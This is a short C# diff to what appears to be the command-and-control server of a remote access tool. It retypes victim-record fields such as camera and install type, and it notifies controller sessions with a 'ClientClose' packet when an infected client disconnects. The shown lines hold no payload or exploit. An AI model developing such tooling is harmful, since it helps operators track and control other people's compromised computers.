@@ -2,6 +2,7 @@
 using Microsoft.VisualBasic;
 using System;
 using System.IO;
+using System.Linq;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
@@ -22,7 +23,6 @@ namespace Server
         public long BytesRecevied { get; set; }
         public ClientInfo Info { get; set; }
         public bool Controler { get; set; }
-        public DateTime LastPing { get; set; }
 
         public class ClientInfo
         {
@@ -30,8 +30,8 @@ namespace Server
             public string IP;
             public string User;
             public string OS;
-            public bool Camera;
-            public long InstallType;
+            public string Camera;
+            public string InstallType;
             public string InstallTime;
             public string Path;
             public string Active;
@@ -128,6 +128,17 @@ namespace Server
                 {
                     lock (Settings.Online)
                         Settings.Online.Remove(this);
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "ClientClose";
+                    msgpack.ForcePathObject("HWID").AsString = this.Info.HWID;
+                    if (Settings.Controler.Count>0)
+                    {
+                        foreach (Clients CL in Settings.Controler.ToList())
+                        {
+                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                        }
+                    }
+                    
                 }
             }
             catch { }
